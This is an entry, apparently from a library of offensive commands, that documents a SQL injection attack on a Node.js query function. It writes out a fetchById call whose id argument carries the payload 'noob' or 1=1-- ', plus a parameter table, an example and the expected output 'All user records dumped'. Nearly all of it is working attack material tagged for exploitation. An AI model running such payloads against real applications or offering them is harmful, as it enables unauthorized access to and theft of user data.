---
data: >-
  query.base.fetchById('users','noob\' or 1=1-- ','username',(msg, res)=>{
  console.log(msg, res) });
tags:
  - sqli
  - exploitation
type: command
output: All user records dumped
executor: javascript
platforms:
  - Node.js
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:15.052Z'
id: 403b323b-1c71-41eb-b6de-9b2d8c12dafe
verified: false
validated: true
submitted: true
---
# node-malicious-fetch

## Command

```javascript
query.base.fetchById('users','noob\' or 1=1-- ','username',(msg, res)=>{ console.log(msg, res) });
```

## Description

Calls fetchById with injected id payload to alter SQL query and return all records.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| id | Malicious: 'noob\' or 1=1-- ' | Yes |
| table | 'users' | Yes |

## Examples

### Basic Usage

```javascript
query.base.fetchById('users','1\' or 1=1-- ','id', callback);
```

## Expected Output

Multiple RowDataPackets for all users.

## Related

- [[Related Procedure|procedures/Exploit-SQL-Injection-with-Malicious-Input]]
